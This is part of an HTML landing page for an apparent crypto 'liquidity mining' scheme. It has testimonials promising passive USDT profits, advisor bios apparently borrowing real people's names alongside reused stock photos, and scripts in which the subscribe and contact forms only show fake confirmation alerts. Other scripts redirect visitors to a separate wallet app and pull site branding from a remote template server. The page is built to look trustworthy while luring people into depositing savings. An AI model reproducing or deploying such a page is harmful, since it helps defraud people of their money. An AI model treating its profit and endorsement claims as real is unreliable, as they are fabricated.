                        <h3>Freya Lindberg</h3> <h4>Store Owner</h4></div>
                </div>
                <div class="swiper-slide" data-swiper-slide-index="3" role="group" aria-label="4 / 5"
                     style="width: 418.667px; margin-right: 20px;">
                    <div class="testimonial-item"><p><i class="bx bxs-quote-alt-left quote-icon-left"></i>
                        My friend spent tens of thousands of dollars on computer mining and he had no idea that
                        I was earning even more than him because I'm using liquidity mining. I showed him my
                        results and invited him to join me; and now he has sold his mining machine.
                        <i class="bx bxs-quote-alt-right quote-icon-right"></i></p> <img
                            src="./assets/img/testimonials-2.jpg" alt="" class="testimonial-img">
                        <h3>Jacob Williams</h3> <h4>Freelancer</h4></div>
                </div>
                <div class="swiper-slide swiper-slide-prev" data-swiper-slide-index="4" role="group"
                     aria-label="5 / 5" style="width: 418.667px; margin-right: 20px;">
                    <div class="testimonial-item"><p><i class="bx bxs-quote-alt-left quote-icon-left"></i>
                        I had a typical office job before, but now I’ve quit my job and started traveling around
                        the world while I'm making money! This is the answer you've been seeking for if the life
                        you want is the life that I’m living.
                        <i class="bx bxs-quote-alt-right quote-icon-right"></i></p> <img
                            src="./assets/img/testimonials-1.jpg" alt="" class="testimonial-img">
                        <h3>John Phillips</h3> <h4>Freelancer</h4></div>
                </div>
                <div class="swiper-slide swiper-slide-duplicate swiper-slide-active" data-swiper-slide-index="0"
                     role="group" aria-label="1 / 5" style="width: 418.667px; margin-right: 20px;">
                    <div class="testimonial-item"><p><i class="bx bxs-quote-alt-left quote-icon-left"></i>
                        At first, I put a small amount of USDT in my wallet and then spent a month evaluating
                        the effect of this platform. The numbers shown on the final statement made up my mind to
                        continue using it. It is so amazing that I don't need to do any operation to get a
                        profit.
                        <i class="bx bxs-quote-alt-right quote-icon-right"></i></p> <img
                            src="./assets/img/testimonials-1.jpg" alt="" class="testimonial-img">
                        <h3>Jake Robinson</h3> <h4>financial analyst </h4></div>
                </div>
                <div class="swiper-slide swiper-slide-duplicate swiper-slide-next" data-swiper-slide-index="1"
                     role="group" aria-label="2 / 5" style="width: 418.667px; margin-right: 20px;">
                    <div class="testimonial-item"><p><i class="bx bxs-quote-alt-left quote-icon-left"></i>
                        It's hard to imagine that I could make a profit while I'm busy raising three kids and
                        having a job; all I need to do is to put the money from my savings into the wallet and
                        just watch it grow, thanks to technology these days!
                        <i class="bx bxs-quote-alt-right quote-icon-right"></i></p> <img
                            src="./assets/img/testimonials-2.jpg" alt="" class="testimonial-img">
                        <h3>Hannah Meyer</h3> <h4>Purchasing Agent</h4></div>
                </div>
                <div class="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="2" role="group"
                     aria-label="3 / 5" style="width: 418.667px; margin-right: 20px;">
                    <div class="testimonial-item"><p><i class="bx bxs-quote-alt-left quote-icon-left"></i>
                        I spent a long time researching passive income and my stocks made me lose a lot of money
                        until I
                        found
                        and it really helped me so much. Thanks to the developers of , I don't
                        need to
                        learn about blockchain to participate in mining.
                        <i class="bx bxs-quote-alt-right quote-icon-right"></i></p> <img
                            src="./assets/img/testimonials-3.jpg" alt="" class="testimonial-img">
                        <h3>Jena Karlis</h3> <h4>Store Owner</h4></div>
                </div>
            </div>
            <div class="swiper-pagination swiper-pagination-clickable swiper-pagination-bullets swiper-pagination-horizontal">
                        <span class="swiper-pagination-bullet swiper-pagination-bullet-active" tabindex="0"
                              role="button" aria-label="Go to slide 1"></span><span class="swiper-pagination-bullet"
                                                                                    tabindex="0" role="button"
                                                                                    aria-label="Go to slide 2"></span><span
                    class="swiper-pagination-bullet" tabindex="0" role="button"
                    aria-label="Go to slide 3"></span><span class="swiper-pagination-bullet" tabindex="0"
                                                            role="button"
                                                            aria-label="Go to slide 4"></span><span
                    class="swiper-pagination-bullet" tabindex="0" role="button"
                    aria-label="Go to slide 5"></span></div>
            <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span></div>
    </div>
</section>
<section id="team" class="team section-bg">
    <div class="container">
        <div class="section-title"><span>Team</span>
            <h2>Team</h2>
            <p>Creating an economically fair world</p></div>
        <div class="row">
            <div class="col-lg-3 col-md-6 d-flex align-items-stretch">
                <div class="member"><img src="./assets/img/testimonials-1.jpg" alt=""> <h4>Tom Gonser</h4> <span>Advisor</span>
                    <p>
                        Tom is the founder of DocuSign, the leading e-signature company that revolutionized
                        digital contracts.
                        He is a seasoned entrepreneur, executive, and board member who has created billions of
                        dollars in
                        enterprise value.
                    </p></div>
            </div>
            <div class="col-lg-3 col-md-6 d-flex align-items-stretch">
                <div class="member"><img src="./assets/img/testimonials-2.jpg" alt=""> <h4>Andrew Miller</h4>
                    <span>Technical Advisor</span>
                    <p>
                        Andrew is a well known leader in decentralized consensus research and secure blockchain
                        infrastructure.
                        He's an associate professor of computer science at the University of Illinois and an
                        advisor to both
                        Zcash and Tezos.
                    </p></div>
            </div>
            <div class="col-lg-3 col-md-6 d-flex align-items-stretch">
                <div class="member"><img src="./assets/img/testimonials-3.jpg" alt=""> <h4>Evan Cheng</h4>
                    <span>Technical Advisor</span>
                    <p>
                        Evan is one of the creators of LLVM which generates the low level machine code running
                        every Apple
                        device, as well as much of Google, Nvidia, and Intel. He is currently Director of
                        Engineering at Novi,
                        a
                        Facebook subsidiary building for the Libra payment system.
                    </p></div>
            </div>
            <div class="col-lg-3 col-md-6 d-flex align-items-stretch">
                <div class="member"><img src="./assets/img/testimonials-1.jpg" alt=""> <h4>Brian Lio</h4> <span>Advisor</span>
                    <p>
                        Brian is the CEO of Smith+Crown, a widely accepted leader in blockchain research that
                        provides
                        in-depth
                        analysis of both ongoing token sales and the larger evolution of decentralized
                        technology over the
                        past
                        two years.
                    </p></div>
            </div>
        </div>
    </div>
</section>

<script type="text/javascript">
    function onSubscribe() {
        let val = document.getElementById("email-value").value
        if (!val || val.indexOf('@') == '-1') return
        setTimeout(() => {
            alert('Thank you for subscribing!')
            document.getElementById("email-value").value = ""
        }, 500)
    }

    function onSendMessage() {
        let name = document.getElementById('name').value
        let email = document.getElementById('email').value
        let subject = document.getElementById('subject').value
        let message = document.getElementById('message').value
        if (!name || !email || !subject || !message) {
            alert('All content must be filled in')
            return
        }
        setTimeout(() => {
            alert('Thank you for your feedback, we will reply to you as soon as possible!')
            document.getElementById("email-value").value = ""
        }, 500)
    }

    function getUrlArgObject() {
        var args = new Object();
        var query = location.search.substring(1);//获取查询串
        var pairs = query.split("&");//在逗号处断开
        for (var i = 0; i < pairs.length; i++) {
            var pos = pairs[i].indexOf('=');//查找name=value
            if (pos == -1) {//如果没有找到就跳过
                continue;
            }
            var argname = pairs[i].substring(0, pos);//提取name
            var value = pairs[i].substring(pos + 1);//提取value
            args[argname] = unescape(value);//存为属性
        }
        return args;//返回对象
    }

    function getUrlArgStr() {
        var q = location.search.substr(1);
        var qs = q.split('&');
        var argStr = '';
        if (qs) {
            for (var i = 0; i < qs.length; i++) {
                argStr += qs[i].substring(0, qs[i].indexOf('=')) + '=' + qs[i].substring(qs[i].indexOf('=') + 1);
                if (i < qs.length - 1)
                    argStr += "&"
            }
        }
        return argStr;
    }


    function onGetStarted() {
        var params = getUrlArgObject()
        var params2 = getUrlArgStr()
        let host = window.location.host.replace('www.', 'defi.')
        var url = 'https://' + host + "/h5/#/"
        if (params2)
            url += "?" + params2
        window.location.href = url
    }

</script>
<!-- Vendor JS Files -->
<script src="./js/bootstrap.bundle.min.js"></script>
<script src="./js/glightbox.min.js"></script>
<script src="./js/isotope.pkgd.min.js"></script>
<script src="./js/validate.js"></script>
<script src="./js/purecounter.js"></script>
<script src="./js/swiper-bundle.min.js"></script>

<!-- Template Main JS File -->
<script src="./js/main.js"></script>

<script src="./js/axios.js"></script>
<script type="text/javascript">
    new Vue({
        el: '#app',
        data() {
            return {
                config: {},
                domain: '',
            }
        },
        created() {
            this.getList()

        },
        methods: {
            getList() {
                var domain = document.domain
                //domain = domain.replaceAll(".", "-")
                domain = domain.replace(/\./g,"-")
                //todo
                var baseUrl = "https://" + domain + ".duliguiji.top/"

                this.baseUrl = baseUrl

                this.post(baseUrl + "coinbase").then(res => {
                    console.log(res)
                    this.config = res.data
                    document.getElementById("app_name").innerText = res.data.app_name
                })
            },
            post(url, data = {}) {
                try {
                    return axios.post(url, data, {}).then(res => {
                        if (res.status !== 200) {

                            return false
                        }
                        return res.data
                    })
                } catch (e) {
                    
                }

            },
        }
    })

</script>

</body>
</html>
